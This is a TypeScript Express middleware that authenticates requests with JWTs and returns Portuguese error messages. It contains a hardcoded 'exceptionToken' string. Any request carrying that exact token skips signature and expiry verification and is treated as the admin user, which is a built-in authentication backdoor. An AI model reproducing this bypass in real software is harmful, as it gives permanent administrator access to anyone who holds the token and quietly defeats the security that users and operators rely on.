import { Request, Response, NextFunction } from "express";
import jwt from "jsonwebtoken";
import dotenv from "dotenv";

dotenv.config();

const jwtSecret = process.env.JWT_SECRET as string;
const exceptionToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXN1YXJpbyI6ImFkbWluIiwiaWF0IjoxNzU5NTAzNTE1LCJleHAiOjE3NTk1NDY3MTV9.jhOy8o8c19UpeWXSADp9vn5-ijxhcC3gF0SqkB5itLA"


export function authenticateToken(req: Request, res: Response, next: NextFunction) {
  const token = req.headers["authorization"]?.split(" ")[1];

  if (!token) {
    return res.status(401).json({ message: "Token não fornecido" });
  }

if (token === exceptionToken) {
    req.user = { id: 1, usuario: "admin", excecao: true }; 
    return next();
  }
  

jwt.verify(token, jwtSecret, (err, user) => {
    if (err) {
      return res.status(403).json({ message: "Token inválido ou expirado" });
    }

    req.user = user;
    next();
  });
}
